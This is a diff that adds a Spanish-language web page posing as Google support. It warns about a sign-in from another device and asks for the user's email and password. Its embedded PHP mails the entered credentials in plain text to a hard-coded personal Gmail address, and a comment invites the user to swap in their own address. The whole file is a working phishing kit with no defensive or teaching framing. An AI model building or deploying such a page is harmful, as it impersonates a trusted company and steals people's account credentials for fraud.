@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<title>Soporte_Google.html</title>
+</head>
+<body>
+	<h1>Bienvenido al soporte de Google</h1>
+	<h2>¿Usted ha iniciado sesión en otro dispositivo?</h2>
+	<form action="procesar_formulario.php" method="post">
+		<p>
+			<button type="button">Sí, he sido yo</button>
+			<button type="button">No he sido yo</button>
+		</p>
+		<h3>Introduzca su email:</h3>
+		<label for="email">Email:</label>
+		<input type="email" id="email" name="email" required><br /><br />
+
+		<label for="password">Contraseña:</label>
+		<input type="password" id="password" name="password" required><br /><br />
+
+		<button type="submit">siguiente</button>
+	</form>
+	
+<?php
+if ($_SERVER["REQUEST_METHOD"] == "POST") {
+	$email = filter_var($_POST["email"], FILTER_SANITIZE_EMAIL);
+	$password = htmlspecialchars($_POST["password"]);
+
+	$destinatario = "yankarlor.08@gmail.com"; // Cambia a tu correo
+	$asunto = "Nuevo mensaje del formulario de Soporte Google";
+	$contenido = "Email: $email\nContraseña: $password";
+
+	// Envía el correo
+	if (mail($destinatario, $asunto, $contenido)) {
+		echo "El mensaje se ha enviado correctamente.";
+	} else {
+		echo "Hubo un error al enviar el mensaje.";
+	}
+}
+?>
+	
+	
+</body>
+</html>
